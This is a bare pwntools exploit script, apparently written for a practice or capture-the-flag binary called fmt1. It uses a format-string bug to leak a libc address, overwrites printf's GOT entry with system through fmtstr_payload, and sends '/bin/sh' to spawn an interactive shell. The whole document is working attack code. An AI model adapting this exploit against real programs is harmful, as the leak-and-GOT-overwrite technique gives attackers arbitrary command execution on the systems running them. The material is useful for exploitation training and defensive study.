from pwn import *

context.log_level = 'debug'
context.arch='amd64'
io = process('./fmt1')
elf = ELF("./fmt1")
printf_got = elf.got['printf']

payload = b'%9$p\0'

gdb.attach(io, 'b printf')
io.sendafter(b'Input: \n', payload)

addr1 = int(io.recv(14), 16)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libcbase = addr1 - 0x2a1ca
system_addr = libcbase + libc.sym['system']
print(f"base {libcbase:#x}")

# payload = f'%{system_addr &0xff}c%8$n'.ljust(24, '\0').encode() + p64(printf_got)

payload = fmtstr_payload(6, {printf_got: system_addr})

io.sendafter(b'Input: \n', payload)

io.sendafter(b'Input: \n', b'/bin/sh\0')


io.interactive()